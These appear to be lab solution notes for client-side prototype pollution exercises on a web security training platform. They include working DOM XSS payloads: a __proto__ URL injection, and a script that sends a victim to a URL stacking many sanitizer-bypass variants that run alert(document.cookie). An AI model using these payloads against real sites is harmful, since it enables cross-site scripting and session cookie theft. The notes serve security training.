 ## Prototype Pollution Vulnerabilities
- ==Client-side prototype pollution via browser APIs==
  DOM Invader solution
- ==DOM XSS via client-side prototype pollution==
  Open DOM Invader settings and scan for gadgets and reload page.
- ==DOM XSS via an alternative prototype pollution vector==
  Adjust the paytload by adding a trailing dash
  
  https://lab_id.web-security-academy.net/?__proto__.sequence=alert%281%29-
- ==Client-side prototype pollution via flawed sanitization==
  Use DOM Invader to Scan for gadget and exploit
- ==Client-side prototype pollution in third-party libraries==
  Use DOM Invader then adjust the payload and deliver to victim using exploit server
  ```
  <script>
  window.location="https://lab_id.web-security-academy.net/?constructor[prototype][hitCallback]=alert%28document.cookie%29&constructor.prototype.hitCallback=alert%28document.cookie%29&__proto__.hitCallback=alert%28document.cookie%29&__proto__[hitCallback]=alert%28document.cookie%29&constrconstructoructor[prototype][hitCallback]=alert%28document.cookie%29&constrconstructoructor.prototype.hitCallback=alert%28document.cookie%29&__pro__proto__to__.hitCallback=alert%28document.cookie%29&__pro__proto__to__[hitCallback]=alert%28document.cookie%29#constructor[prototype][hitCallback]=alert%28document.cookie%29&constructor.prototype.hitCallback=alert%28document.cookie%29&__proto__.hitCallback=alert%28document.cookie%29&__proto__[hitCallback]=alert%28document.cookie%29&constrconstructoructor[prototype][hitCallback]=alert%28document.cookie%29&constrconstructoructor.prototype.hitCallback=alert%28document.cookie%29&__pro__proto__to__.hitCallback=alert%28document.cookie%29&__pro__proto__to__[hitCallback]=alert%28document.cookie%29"
</script>
```
